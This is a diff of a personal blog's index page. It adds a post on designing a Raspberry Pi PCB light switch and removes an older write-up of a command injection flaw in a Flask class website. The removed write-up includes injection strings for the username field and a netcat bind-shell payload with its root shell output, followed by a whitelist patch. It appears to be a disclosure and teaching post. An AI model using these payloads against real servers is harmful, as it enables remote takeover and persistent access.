@@ -9,10 +9,9 @@
   <meta name="author" content="Mark Mossberg">
 
   
-  <meta name="description" content="This post is about an interesting race condition bug I ran into when working
-on a small feature improvement for
-poet a while ago
-that I thought was &hellip;">
+  <meta name="description" content="This is a pretty late post, but I wanted to show off the hardware I designed
+as a follow up to the first
+&ldquo;Building a Simple IoT Light Switch& &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -82,6 +81,143 @@ that I thought was &hellip;">
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/14/building-a-simple-iot-light-switch/">Building a Simple IoT Light Switch, Pt. 2</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-14T15:13:07-04:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:13 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>This is a pretty late post, but I wanted to show off the hardware I designed
+as a follow up to the first
+<a href="/blog/2015/01/18/a-simple-iot-light-switch/">&ldquo;Building a Simple IoT Light Switch&rdquo;</a>.
+In that post I presented a prototype of a smart light switch I designed that
+consisted of a button which triggered a small Python server running on a
+Raspberry Pi to control my Phillips Hue lights over an HTTP API. It was an
+extraordinarily simple design that worked well enough, how it was very
+inconvenient to transport since I had to rewire the breadboard to the raspi
+GPIO pins every time I moved. Since it seemed production ready
+for my needs, I decided to solve this problem by using this as an opportunity
+to learn PCB design and actually design a production board.</p>
+
+<p>Special thanks go to <a href="http://nickkubasti.com/">Nick Kubasti</a> for teaching me
+how to use KiCad and to <a href="http://thejohnsullivan.com/">John Sullivan</a> for helping
+me with the final lab work.</p>
+
+<p>The basic circuit I designed is below. It is merely a GPIO pin hooked up to
+ground with a switch in between, and an LED and resistor for fun.</p>
+
+<p><img src="/images/iot2/switch1.png" alt="" /></p>
+
+<p>The code behind this configures the GPIO pin to use a pull up resistor, which
+pulls the pin&rsquo;s voltage up to VCC when the button is not pressed, and down to
+GND when it is. This lets the code poll for when the pin&rsquo;s value is <code>False</code>.
+A more complete schematic including the pull up resistor is below. Note that
+I won&rsquo;t have to implement the pull up part in my design because the Raspberry
+Pi implements that internally.</p>
+
+<p><img src="/images/iot2/switch2.png" alt="" /></p>
+
+<p>My initial idea was to have a little board that would plug straight down into
+the Pi&rsquo;s GPIO female headers with a little button and LED at the end. However,
+that was really wasteful since that would block all of the pin even though
+I was only using three of them (input, GND, VCC). Nick suggested a board design
+that had two sets of headers: one set of male ones for plugging downwards as I
+had originally thought, and one set of female ones facing upward that all the
+unused pins would be forwarded to. This way, even though the downward facing
+male pins are all plugged in, they can all still be accessed since the board
+traces simply connect the unused male pins to the corresponding female ones.
+The exception to this is GPIO pin 11, which is the one actually being used for
+the switch. I just need to remember for future projects that pin 11 is
+reserved. That was probably really hard to understand, so here&rsquo;s the schematic,
+created with KiCad.</p>
+
+<p><img src="/images/iot2/schematic.png" alt="" /></p>
+
+<p>On the left you can see the two sets of 13 x 2 headers. The ones on the left
+will be the male ones that plug downward into the Pi&rsquo;s female headers. The
+ones on the right will be the female ones that wires can be plugged into.
+All those wires going around the top and bottom are the forwarded connections.
+The one pin exclusively in use on the left is pin 11, which is connected to
+the circuit. All the rest are unused, and wires are used to connect them to
+their corresponding female header. Pins 1 and 9 are technically in use, but
+since they correspond to VCC and GND, it&rsquo;s fine to forward them too.</p>
+
+<p>The actual circuit is in the bottom left. It&rsquo;s very similar to the above
+circuit diagrams, pin 11 is connected to GND (pin 9) via a switch, and
+3.3V VCC (pin 1) is connected to an LED, resistor, and the same GND (pin 9).</p>
+
+<p>The next step after creating the schematic, and assigning actual parts to each
+of the components, was to design the printed circuit board (PCB). This involves
+laying out the components as they will appear on the physical
+silicon wafer.</p>
+
+<p><img src="/images/iot2/pcb.png" alt="" /></p>
+
+<p>This was a completely new area to me and it was challenging and fun to
+actually draw out the board&rsquo;s traces, taking care not to intersect them,
+and using the different layers when necessary. You might notice that there&rsquo;s
+a seemingly random set of 1 x 2 headers in the middle of the area where the
+switch goes. I added those because I noticed that the button and LED were going
+to actually extend off the end of the Pi. I was concerned about how pressing
+down on the button would actually flip the Pi a little bit, so Nick had an
+incredible idea and suggested adding space for a pair of dud headers that
+could be used as legs to support the end of the PCB that hung off the side
+of the Pi.</p>
+
+<p>After this, I was then able to pretty easily use KiCad to generate some
+Gerber files to send to the fab. I chose to use
+<a href="https://oshpark.com/">OshPark</a> based on Nick&rsquo;s recommendation, and they turned
+out to be a great option. I was able to get three copies of my board, with
+free shipping for &lt;$8!</p>
+
+<p>After waiting a couple of weeks for the boards to come in, John helped me
+solder everything together to finish up this project. During this process
+we noticed one design mistake: the layout of the switch was actually <em>way</em>
+too big for the switch we had on hand, but that didn&rsquo;t turn out to be a serious
+issue.</p>
+
+<p><img src="/images/iot2/mistake.jpg" alt="" /></p>
+
+<p>There are some pictures of the final product:</p>
+
+<p><img src="/images/iot2/final1.jpg" alt="" />
+<img src="/images/iot2/final2.jpg" alt="" />
+<img src="/images/iot2/final3.jpg" alt="" />
+<img src="/images/iot2/final4.jpg" alt="" /></p>
+
+<p>Here&rsquo;s a video of it in action:</p>
+
+<blockquote class="instagram-media" data-instgrm-version="4" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:50% 0; text-align:center; width:100%;"> <div style=" background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAsCAMAAAApWqozAAAAGFBMVEUiIiI9PT0eHh4gIB4hIBkcHBwcHBwcHBydr+JQAAAACHRSTlMABA4YHyQsM5jtaMwAAADfSURBVDjL7ZVBEgMhCAQBAf//42xcNbpAqakcM0ftUmFAAIBE81IqBJdS3lS6zs3bIpB9WED3YYXFPmHRfT8sgyrCP1x8uEUxLMzNWElFOYCV6mHWWwMzdPEKHlhLw7NWJqkHc4uIZphavDzA2JPzUDsBZziNae2S6owH8xPmX8G7zzgKEOPUoYHvGz1TBCxMkd3kwNVbU0gKHkx+iZILf77IofhrY1nYFnB/lQPb79drWOyJVa/DAvg9B/rLB4cC+Nqgdz/TvBbBnr6GBReqn/nRmDgaQEej7WhonozjF+Y2I/fZou/qAAAAAElFTkSuQmCC); display:block; height:44px; margin:0 auto -44px; position:relative; top:-22px; width:44px;"></div></div><p style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;"><a href="https://instagram.com/p/37ZQ8_n86u/" style=" color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;" target="_top">A video posted by Mark Mossberg (@mssbrg)</a> on <time style=" font-family:Arial,sans-serif; font-size:14px; line-height:17px;" datetime="2015-06-14T23:29:39+00:00">Jun 14, 2015 at 4:29pm PDT</time></p></div></blockquote>
+
+
+<script async defer src="//platform.instagram.com/en_US/embeds.js"></script>
+
+
+<p>Thanks for reading! I have two extra boards I&rsquo;m not doing anything with, so
+if you happen to have a Raspberry Pi and some Hue lights, I&rsquo;d be happy to give
+you the hardware and software for your own DIY light switch.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -2090,173 +2226,6 @@ J
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/03/01/ihackedit/">iHackedIT</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-03-01T14:00:00-05:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>2:00 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><em>Discovering, patching, and exploiting a simple command injection webapp</em></p>
-
-<h2>Introduction</h2>
-
-<p>The university that I study at, <a href="http://neu.edu">Northeastern</a> has an awesome <a href="http://www.northeastern.edu/entrepreneurs/">Entrepreneurs Club</a>. One of the programs that they run is called <a href="http://www.northeastern.edu/entrepreneurs/programs/imadeit/">iMadeIT</a> which is a series of workshops designed to help entrepreneurs with a nontechnical background to learn about web development. This post is going go over a vulnerability I discovered in the iMadeIT class website, how I patched, and how an attacker might exploit it in a real situation.</p>
-
-<h2>Background</h2>
-
-<p>The workshops are taught using <a href="http://flask.pocoo.org/">Flask</a>, a Python microframework for web development known for its simplicity and ease of use for beginners. Students taking the class would sign up at <a href="http://imadeit.nu">imadeit.nu</a>, which would make them an account on the website for class management purposes, but also would interestingly create an account for them on the server running the iMadeIT site as well as allow them to &ldquo;register&rdquo; a TCP port to run their Flask app on. This would allow students to have a live link on the internet so they could show off what they&rsquo;ve been working on to people (instead of just running on localhost) without requiring everyone to have their own server.</p>
-
-<h2>The Vulnerability</h2>
-
-<p>Anyway, the iMadeIT guys open sourced the <a href="https://github.com/imadeitnortheastern/spring2014">code</a> that runs their imadeit.nu website and since it is actually written in Flask which is something I&rsquo;ve been meaning to learn for a while now, I decided to take a look at it to see if I could understand anything.</p>
-
-<p>After poking around in the code for a bit, I noticed this particularly interesting function:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
-</span><span class='line'>    <span class="p">{</span><span class="o">...</span><span class="p">}</span>
-</span><span class='line'>    <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;useradd -p {} -s /bin/bash -d /home/{} -m {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">enc_pass</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This is what gives the user their own account on the server. If we trace the function calls, we can see that this function is called from the <code>create_account</code> function. Heavily edited to only show relevant sections, it looks like this:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">create_account</span><span class="p">():</span>
-</span><span class='line'>    <span class="p">{</span><span class="o">...</span><span class="p">}</span>
-</span><span class='line'>    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">&#39;create_username&#39;</span><span class="p">]</span>
-</span><span class='line'>    <span class="n">pw</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s">&#39;create_pw&#39;</span><span class="p">]</span>
-</span><span class='line'>    <span class="p">{</span><span class="o">...</span><span class="p">}</span>
-</span><span class='line'>    <span class="n">user</span><span class="o">.</span><span class="n">create</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">pw</span><span class="p">)</span>
-</span><span class='line'>    <span class="p">{</span><span class="o">...</span><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Notice anything? The username is taken from the webpage form and directly passed into the <code>create</code> function without any type of sanitization, creating a classic <a href="https://www.owasp.org/index.php/Command_Injection">command injection</a> vulnerability. What this essentially means is that it&rsquo;s possible for an attacker to put a specially formatted string in the username field that will allow them to execute arbitrary commands on the server.</p>
-
-<p>For example, under ordinary circumstances, a user might enter &ldquo;mark&rdquo; as their username, so the <code>os.system()</code> call would execute:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'>useradd -p <span class="o">{</span>encrypted password<span class="o">}</span> -s /bin/bash -d /home/mark -m mark
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Let&rsquo;s say a user entered &ldquo;mark; ls -l #&rdquo;. Now, <code>os.system()</code> is going to execute:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'>useradd -p <span class="o">{</span>encrypted password<span class="o">}</span> -s /bin/bash -d /home/mark<span class="p">;</span> ls -l<span class="p">;</span> <span class="c"># -m mark; ls -l #</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This will create the user &ldquo;mark&rdquo;, but it will also cause <code>ls -l</code> to be executed, which will list the files in the directory. Now the user that entered this in the form isn&rsquo;t going to see anything; the command executes internally on the server. Hopefully you&rsquo;re seeing now why this is bad - anyone can execute any command on the server as the user that is running the Flask app. In this case it&rsquo;s particularly bad, because the app is running on port 80 of the server which is a &ldquo;privileged&rdquo; port. Since only the superuser is allowed to run network services on ports below 1024, essentially anyone now has root access to the server.</p>
-
-<p>As a side note, the &ldquo;#&rdquo; in the injection is there to comment out the rest of the command (the &ldquo;-m&rdquo; part) so it doesn&rsquo;t interfere with the injection.</p>
-
-<h2>Patching</h2>
-
-<p>This is actually a really easy vulnerability to protect against, all that&rsquo;s required is to make sure that that the username and password fields are checked in some form before they are sent to the system call. In this case, we don&rsquo;t have to worry about the password, because it goes through encryption before being used in the system call, so any attempts to inject in the password field would fail when the attacker&rsquo;s injection gets encrypted.</p>
-
-<p>To check the username input, it&rsquo;s important to use a <a href="https://www.owasp.org/index.php/Positive_security_model">positive security model</a> (a whitelist) over a negative one. This is because using a blacklist of specific characters that aren&rsquo;t allowed can be potentially incomplete and leaves the attacker room to find sneaky ways to exploit this vulnerability using alternative characters that aren&rsquo;t in your blacklist. As a general rule, it&rsquo;s better to use a whitelist of only the characters that are permitted. In this case, for a username, let&rsquo;s say that users should only be allowed to have usernames with lowercase letters, uppercase letters, underscores, and periods. Writing a function to check for this would look like this:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">re</span>
-</span><span class='line'><span class="k">def</span> <span class="nf">valid_username</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
-</span><span class='line'>    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">&#39;[^\w.]&#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
-</span><span class='line'>        <span class="k">return</span> <span class="bp">False</span>
-</span><span class='line'>    <span class="k">else</span>
-</span><span class='line'>        <span class="k">return</span> <span class="bp">True</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In this particular approach, we aren&rsquo;t <em>really</em> sanitizing the input, we&rsquo;re just checking it&rsquo;s validity. In this case, if this function returned false, the <code>create_account</code> function would fail, and we would show an error to the user. An alternative would be to attempt to correct invalid user input by removing invalid characters, however despite potential UX arguments, I think it&rsquo;s personally better just to halt completely and let the user sort it out on their end.</p>
-
-<h3>Exploiting</h3>
-
-<p>Now that we&rsquo;ve described how the vulnerability works, and how to protect against it, let&rsquo;s dirty our white hats a little and check out some steps an attacker might take once discovering the vulnerability.</p>
-
-<p>First of all, we know that we can execute arbitrary commands on the server as the root user. To most, this pretty much is already the definition of being 0wned. However, doing so is sort of awkward; we have to go to the login form and create a new user for every command we want to execute. Let&rsquo;s use netcat to create a rudimentary backdoor into the system by telling netcat to listen on an arbitrary port (say, 1337) and executing a certain file upon receiving a connection (say, <code>/bin/sh</code>).</p>
-
-<p>This command looks like</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>netcat -l -p <span class="m">1337</span> -e /bin/sh
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>and so our injection would look like</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'>mark<span class="p">;</span> netcat -l -p <span class="m">1337</span> -e /bin/sh <span class="p">&amp;</span> <span class="c">#</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Notice that I added a &ldquo;&amp;&rdquo; before the &ldquo;#&rdquo; in the injection. This will cause the backdoor to run in the background because otherwise the flask process would stop while the backdoor is running, and the webapp would stop working. Not very stealthy. When we enter this into the create account form, we won&rsquo;t get any sort of confirmation that our backdoor is working, however we&rsquo;ll know soon enough when we test it. To connect, all we need to do is run</p>
-
-<pre><code>$ netcat [ip address] 1337
-</code></pre>
-
-<p>which will attempt to create a simple TCP connection to the IP address of the server on the same port you specified earlier. If it worked, you won&rsquo;t get a prompt, but you&rsquo;ll have a shell that you can enter commands at. With spaces added for ease of reading, this looks like</p>
-
-<pre><code>$ netcat 1.2.3.4 1337
-
-ls
-imadeit.db
-imadeit.py
-schema.sql
-static
-templates
-user.py
-user.pyc
-
-whoami
-root
-
-echo $SHELL
-/bin/bash
-</code></pre>
-
-<p>Now, the server has been totally owned. Next steps could include adding your ssh public key to the <code>~/.ssh/authorized_keys</code> file for enhanced persistence if the server got restarted, or if someone saw your backdoor and killed it. In a situation where the app wasn&rsquo;t running on port 80 and was running on a nonprivileged port instead, you wouldn&rsquo;t necessarily have root access so you would then use a local exploit to escalate privileges. However for this situation, even exploiting this vulnerability at all is sort of pointless because the webapp actually <em>creates an account for you</em> on the server which you can ssh into, and legitimately get a shell.</p>
-
-<h2>Conclusion</h2>
-
-<p>I hope you can see now how even something as simple as checking user input in a webapp can go a long way in securing your web site and making sure you don&rsquo;t get hacked. After discovering the vuln, I submitted a pull request to iMadeIT&rsquo;s repo on github, which was merged and deployed an astonishing <a href="https://github.com/imadeitnortheastern/spring2014/pull/1"><em>5 minutes</em></a> later, so serious props to them for that. I&rsquo;ve never discovered a serious vulnerability &ldquo;in the wild&rdquo; before, so it was sort of cool to go through the process of submitting the patch and then confirming that it was working in the live site.</p>
-
-<p>That&rsquo;s all, thanks for reading!</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/2">&larr; Older</a>
@@ -2279,6 +2248,10 @@ echo $SHELL
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2015/06/14/building-a-simple-iot-light-switch/">Building a Simple IoT Light Switch, Pt. 2</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2015/06/07/off-to-the-python-internals-races/">Off to the (Python Internals) Races</a>
       </li>
     
@@ -2294,15 +2267,11 @@ echo $SHELL
         <a href="/blog/2014/12/13/poet-beacon-based-post-exploitation/">Poet: Beacon Based Post-Exploitation</a>
       </li>
     
-      <li class="post">
-        <a href="/blog/2014/11/03/netcat-exec/">Netcat &#8220;-e&#8221; Analysis</a>
-      </li>
-    
   </ul>
 </section>
 <section>
   <h1>Categories</h1>
-    <ul id="category-list"><li><a href='/blog/categories/android'>android (1)</a></li><li><a href='/blog/categories/assembly'>assembly (1)</a></li><li><a href='/blog/categories/ctf'>ctf (2)</a></li><li><a href='/blog/categories/hacking'>hacking (7)</a></li><li><a href='/blog/categories/hardware'>hardware (1)</a></li><li><a href='/blog/categories/linux'>linux (4)</a></li><li><a href='/blog/categories/programming'>programming (3)</a></li><li><a href='/blog/categories/python'>python (4)</a></li><li><a href='/blog/categories/reference'>reference (2)</a></li><li><a href='/blog/categories/reverse-engineering'>reverse engineering (2)</a></li><li><a href='/blog/categories/security'>security (6)</a></li><li><a href='/blog/categories/sysadmin'>sysadmin (4)</a></li><li><a href='/blog/categories/web'>web (3)</a></li></ul>
+    <ul id="category-list"><li><a href='/blog/categories/android'>android (1)</a></li><li><a href='/blog/categories/assembly'>assembly (1)</a></li><li><a href='/blog/categories/ctf'>ctf (2)</a></li><li><a href='/blog/categories/hacking'>hacking (7)</a></li><li><a href='/blog/categories/hardware'>hardware (2)</a></li><li><a href='/blog/categories/linux'>linux (4)</a></li><li><a href='/blog/categories/programming'>programming (3)</a></li><li><a href='/blog/categories/python'>python (4)</a></li><li><a href='/blog/categories/reference'>reference (2)</a></li><li><a href='/blog/categories/reverse-engineering'>reverse engineering (2)</a></li><li><a href='/blog/categories/security'>security (6)</a></li><li><a href='/blog/categories/sysadmin'>sysadmin (4)</a></li><li><a href='/blog/categories/web'>web (3)</a></li></ul>
 </section>
 
   
